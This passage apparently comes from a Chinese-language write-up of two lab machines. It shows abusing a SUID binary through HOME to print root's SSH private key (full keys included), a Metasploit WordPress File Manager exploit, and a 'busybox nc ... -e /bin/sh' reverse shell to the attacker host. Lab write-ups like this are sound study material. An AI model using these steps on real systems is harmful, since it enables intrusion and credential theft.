class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/umount</span><br><span class="line">alexia@hommie:~$ cd /opt</span><br><span class="line">alexia@hommie:/opt$ ls -al</span><br><span class="line">total <span class="number">28</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root  <span class="number">4096</span> Sep <span class="number">30</span>  <span class="number">2020</span> .</span><br><span class="line">drwxr-xr-x <span class="number">18</span> root root  <span class="number">4096</span> Sep <span class="number">30</span>  <span class="number">2020</span> ..</span><br><span class="line">-rwsr-sr-x  <span class="number">1</span> root root <span class="number">16720</span> Sep <span class="number">30</span>  <span class="number">2020</span> showMetheKey</span><br><span class="line">alexia@hommie:/opt$ ./showMetheKey</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7</span><br><span class="line">V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y</span><br><span class="line">Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT</span><br><span class="line">gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j</span><br><span class="line">QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq</span><br><span class="line">kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI</span><br><span class="line">M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM</span><br><span class="line">dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW</span><br><span class="line">rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B</span><br><span class="line">tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T</span><br><span class="line">d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/</span><br><span class="line">+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE</span><br><span class="line">Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w</span><br><span class="line">pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk</span><br><span class="line">WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz</span><br><span class="line">bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu</span><br><span class="line">3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6</span><br><span class="line">0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z</span><br><span class="line">HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs</span><br><span class="line">y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY</span><br><span class="line">OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08</span><br><span class="line">QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp</span><br><span class="line">ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN</span><br><span class="line">0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>将showMetheKey提到本地分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;cat $HOME/.ssh/id_rsa&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>改home的环境变量，指向&#x2F;root</p>
<p>然后就可以cat出来root的id_rsa，实现无需密码登录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">alexia@hommie:/opt$ echo $HOME</span><br><span class="line">/home/alexia</span><br><span class="line">alexia@hommie:/opt$ export HOME=/root</span><br><span class="line">alexia@hommie:/opt$ echo $HOME</span><br><span class="line">/root</span><br><span class="line">alexia@hommie:/opt$ ./showMetheKey</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5</span><br><span class="line">hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11</span><br><span class="line">5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk</span><br><span class="line">/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC</span><br><span class="line">EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz</span><br><span class="line">Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL</span><br><span class="line">vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY</span><br><span class="line">DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz</span><br><span class="line">m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy</span><br><span class="line">LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681</span><br><span class="line">2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5</span><br><span class="line">5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N</span><br><span class="line">R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY</span><br><span class="line">sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU</span><br><span class="line">irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk</span><br><span class="line">/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z</span><br><span class="line">DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh</span><br><span class="line">4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie</span><br><span class="line">B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr</span><br><span class="line">zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV</span><br><span class="line">qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi</span><br><span class="line">KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+</span><br><span class="line">12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq</span><br><span class="line">gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>登进去发现root.txt不在root目录下，find搜索一下即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ ssh -i id_rsa root@<span class="number">192.168</span><span class="number">.56</span><span class="number">.36</span></span><br><span class="line">Linux hommie <span class="number">4.19</span><span class="number">.0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed May <span class="number">21</span> <span class="number">22</span>:<span class="number">17</span>:<span class="number">45</span> <span class="number">2025</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span></span><br><span class="line">root@hommie:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@hommie:~<span class="comment"># ls</span></span><br><span class="line">note.txt</span><br><span class="line">root@hommie:~<span class="comment"># cat note.txt</span></span><br><span class="line">I dont remember where I stored root.txt !!!</span><br><span class="line">root@hommie:~<span class="comment"># find / -name &quot;root.txt&quot; 2&gt;/dev/null</span></span><br><span class="line">/usr/include/root.txt</span><br><span class="line">root@hommie:~<span class="comment"># cat /usr/include/root.txt</span></span><br><span class="line">Imnotbatman</span><br></pre></td></tr></table></figure>

<h2 id="Vulny"><a href="#Vulny" class="headerlink" title="Vulny"></a>Vulny</h2><p>扫一下端口，只开了80</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nmap -Pn -n <span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-05-<span class="number">22</span> 08:<span class="number">17</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0033</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http</span><br><span class="line">MAC Address: 08:<span class="number">00</span>:<span class="number">27</span>:<span class="number">29</span>:1D:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.37</span> seconds</span><br></pre></td></tr></table></figure>

<p>扫目录，扫到了secret，访问发现还有二级路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ python dirsearch.py -u http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist size: <span class="number">12289</span></span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/</span><br><span class="line"></span><br><span class="line">[08:<span class="number">19</span>:<span class="number">10</span>] Scanning: </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">12</span>] <span class="number">403</span> -   278B - /.php                                             </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">26</span>] <span class="number">200</span> -   11KB - /index.html                                       </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">27</span>] <span class="number">301</span> -   319B - /javascript  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/javascript/ </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">33</span>] <span class="number">301</span> -   315B - /secret  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/secret/         </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">33</span>] <span class="number">403</span> -   278B - /server-status                                    </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">33</span>] <span class="number">403</span> -   278B - /server-status/                                   </span><br><span class="line">[08:<span class="number">19</span>:<span class="number">33</span>] <span class="number">404</span> -   221B - /secret/ </span><br><span class="line"></span><br><span class="line">              </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">19</span>] <span class="number">404</span> -   221B - /secret/index.php                                 </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">20</span>] <span class="number">404</span> -   221B - /secret/index.php/login/                          </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">37</span>] <span class="number">200</span> -    7KB - /secret/readme.html                               </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-config.php                             </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">200</span> -    2KB - /secret/wp-content/                               </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">301</span> -   326B - /secret/wp-content  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/secret/wp-content/</span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">500</span> -   611B - /secret/wp-content/plugins/akismet/akismet.php    </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">500</span> -   611B - /secret/wp-content/plugins/akismet/admin.php      </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">403</span> -   278B - /secret/wp-includes/                              </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">301</span> -   324B - /secret/wp-admin  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/secret/wp-admin/</span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">500</span> -     0B - /secret/wp-includes/rss-functions.php             </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">301</span> -   327B - /secret/wp-includes  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>/secret/wp-includes/</span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">200</span> -    1KB - /secret/wp-content/uploads/                       </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-admin/admin-ajax.php                   </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">200</span> -  1004B - /secret/wp-content/upgrade/                       </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">200</span> -  1006B - /secret/wp-content/themes/                        </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-admin/install.php                      </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-cron.php                               </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-admin/                                 </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-login.php                              </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/wp-signup.php                             </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">43</span>] <span class="number">404</span> -   221B - /secret/xmlrpc.php                                 </span><br><span class="line">[08:<span class="number">20</span>:<span class="number">44</span>] <span class="number">500</span> -    3KB - /secret/wp-admin/setup-config.php   </span><br></pre></td></tr></table></figure>

<p>wordpress</p>
<p>在<a target="_blank" rel="noopener" href="http://192.168.56.39/secret/wp-content/uploads/2020/10/%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%8F%91%E7%8E%B0%E4%BA%86wp%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8Cwp6.0">http://192.168.56.39/secret/wp-content/uploads/2020/10/路径下发现了wp的版本，wp6.0</a></p>
<p>检索发现存在历史漏洞</p>
<p>这里用msf一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/wp_file_manager_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)</span><br><span class="line">   Proxies                     no        A proxy chain of <span class="built_in">format</span> <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     <span class="number">192.168</span><span class="number">.56</span><span class="number">.39</span>    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      <span class="number">80</span>               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  secret           yes       Base path to WordPress installation</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span>     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">1234</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   WordPress File Manager <span class="number">6.0</span>-<span class="number">6.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info <span class="keyword">with</span> the info, <span class="keyword">or</span> info -d command.</span><br></pre></td></tr></table></figure>

<p>进入shell后反弹到宿主机里面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">1233</span> -e /<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure>

<p>有效用户adrian</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;ress/wp-content/plugins/wp-file-manager/lib/files$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/<span class="built_in">bin</span>:/<span class="built_in">bin</span>/sync</span><br><span class="line">games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:<span class="number">6</span>:<span class="number">12</span>:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="built_in">bin</span>:/usr/sbin/nologin</span><br><span class="line">www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="type">List</span> Manager:/var/<span class="built_in">list</span>:/usr/sbin/nologin</span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:<span class="number">100</span>:<span class="number">102</span>:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:<span class="number">101</span>:<span class="number">103</span>:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:<span class="number">102</span>:<span class="number">104</span>:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:<span class="number">103</span>:<span class="number">106</span>::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:<span class="number">104</span>:<span class="number">110</span>::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:<span class="number">105</span>:<span class="number">65534</span>::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:<span class="number">106</span>:<span class="number">111</span>:TPM software stack,,,:/var/lib/tpm:/<span class="built_in">bin</span>/false</span><br><span class="line">uuidd:x:<span class="number">107</span>:<span class="number">112</span>::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:<span class="number">108</span>:<span class="number">113</span>::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:<span class="number">109</span>:<span class="number">115</span>::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:<span class="number">110</span>:<span class="number">1</span>::/var/cache/pollinate:/<span class="built_in">bin</span>/false</span><br><span class="line">sshd:x:<span class="number">111</span>:<span class="number">65534</span>::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:<span class="number">999</span>:<span class="number">999</span>:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">adrian:x:<span class="number">1000</span>:<span class="number">1000</span>:adrian:/home/adrian:/<span class="built_in">bin</span>/bash</span><br><span class="line">lxd:x:<span class="number">998</span>:<span class="number">100</span>::/var/snap/lxd/common/lxd:/<span class="built_in">bin</span>/false</span><br><span class="line">mysql:x:<span class="number">112</span>:<span class="number">117</span>:MySQL Server,,,:/nonexistent:/<span class="built_in">bin</span>/false</span><br></pre></td></tr></table></figure>

<p>在&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php发现了一段注释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idrinksomewater</span><br></pre></td></tr></table></figure>

<p>这里是adrian用户的密码</p>
<p>切换到adrian用户尝试提权</p>
<p>无须输入密码即可sudo运行flock</p>
